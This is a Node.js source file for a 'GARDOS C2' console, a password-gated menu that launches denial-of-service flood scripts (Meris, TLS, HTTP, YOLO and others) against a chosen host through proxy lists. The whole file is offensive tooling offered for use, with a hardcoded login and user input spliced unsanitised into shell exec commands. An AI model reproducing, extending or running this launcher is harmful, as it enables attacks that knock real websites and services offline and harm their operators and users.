const readline = require('readline');
const { exec } = require('child_process');
const prompt = require('prompt-sync')();
const os = require('os');
const { sleep } = require('sleep');

const B = '\x1b[35m'; // MERAH
const P = '\x1b[1;37m'; // PUTIH

const menu = () => {
    console.clear();
    console.log(`
#          #### #       ####   ####  ###   ### ####
#        # #    #      #      #    # #  # #  # #
#    #   # #### #      #      #    # #   #   # ####
#    #   # #    #      #      #    # #       # #
_# #__####_####_######__####___####__#_______#_####______
YOU USERNAME : root
IP ADDRESS : 120.0.1
VIP : YES
ISP : kucing modol ning celana
WARN!! : the tools can stop because the tools ddos is work in behind system,
and please run this tools with vps, because if with kentang device can meleduk
_________________________________________________________
MENU 
_________________________________________________________
MERIS-FLOODER (VIP) :: example : meris-flooder -target -time -req
RAPID :: Rapid target time threads req_per_ip 
TLS-VIP
TLS_SILIT
MIX1 :: mix1 host threads time
MIX2 :: mix2 host time
YOLO :: yolo host time rps threads 
NOX :: nox host time threads rps
HTTP :: HTTP host time threads 
FLOODER :: flooder host time threads rps bypass / flood
_________________________________________________________)
`);
};

const main = () => {
    while (true) {
        process.stdout.write('\x1b]2;[/] .:GARDOS C2:. :: welcome to GARDOS C2\x07');
        const sin = prompt(`${B}ZxPLOIT@root${P}:~# `);
        const sinput = sin.split(' ')[0];
        
        if (sinput === 'clear' || sinput === 'cls' || sinput === 'CLS') {
            exec('clear');
            menu();
        }   else if (sinput === '') {
            main();
        } else if (sinput === 'meris-flooder' || sinput === 'MERIS-FLOODER') {
            const [host, time, req] = sin.split(' ').slice(1);
            exec(`node meris-flooder.js ${host} ${time} 5 ${req} GET proxy.txt`, () => {
                exec('clear');
                menu();
            });
        } else if (sinput === 'rapid' || sinput === 'Rapid') {
            const [host, time, req] = sin.split(' ').slice(1);
            exec(`node Rapid.js ${host} ${time} ${req} 5 proxy.txt`, () => {
                exec('clear');
                menu();
            });
        } else if (sinput === 'tls-vip' || sinput === 'TLS-VIP') {
            const [host, time, req] = sin.split(' ').slice(1);
            exec(`node Rapid.js ${host} ${time} ${req} 10 proxy.txt`, () => {
                exec('clear');
                menu();
            });
        } else if (sinput === 'tls-silit' || sinput === 'TLS-SILIT') {
            const [host, time, req] = sin.split(' ').slice(1);
            exec(`node tls-vip.js ${host} ${time} ${req} 5 proxy.txt`, () => {
                exec('clear');
                menu();
            });
        } else if (sinput === 'MIX1' || sinput === 'mix1') {
            const [host, time, thread] = sin.split(' ').slice(1);
            exec(`node MIX.js ${host} ${thread} ${time}`, () => {
                exec('clear');
                menu();
            });
        
        } else if (sinput === 'MIX2' || sinput === 'mix2') {
            const [host, time] = sin.split(' ').slice(1);
            exec(`node mix2.js ${host} ${time}`, () => {
                exec('clear');
                menu();
            });
        } else if (sinput === 'YOLO' || sinput === 'yolo') {
            const [host, time, threads, rps] = sin.split(' ').slice(1);
            exec(`node YOLO.js ${host} ${time} ${rps} ${threads} proxy.txt`, () => {
                exec('clear');
                menu();
            });
        } else if (sinput === 'nox' || sinput === 'NOX') {
            const [host, time, threads, rps] = sin.split(' ').slice(1);
            exec(`node nox.js ${host} ${time} ${threads} ${rps}  proxy.txt`, () => {
                exec('clear');
                menu();
            });
        } else if (sinput === 'http' || sinput === 'HTTP') {
            const [host, time, threads, rps] = sin.split(' ').slice(1);
            exec(`node http.js ${host} ${time} ${threads} proxy.txt ${rps}`, () => {
                exec('clear');
                menu();
            });
        } else if (sinput === 'flooder' || sinput === 'FLOODER') {
            const [host, time, threads, rps, byflod] = sin.split(' ').slice(1);
            exec(`node flooder.js ${host} ${time} ${threads} proxy.txt ${rps} ${byflod}`, () => {
                exec('clear');
                menu();
            });
        }
    
    };
    
};


const login = () => {
    console.clear();
    const user = 'root';
    const passwd = '23';
    const username = prompt('username dude : ');
    const password = prompt('PASSWORD? : ', { echo: '#' });
    
    if (username !== user || password !== passwd) {
        console.log('\nusername or password wrong pls buy');
        sleep(3);
        process.exit(1);
    } else if (username === user && password === passwd) {
        console.log('\nWELCOME TO GARDOS C2');
        sleep(3);
        menu();
        main();
    }
};

login();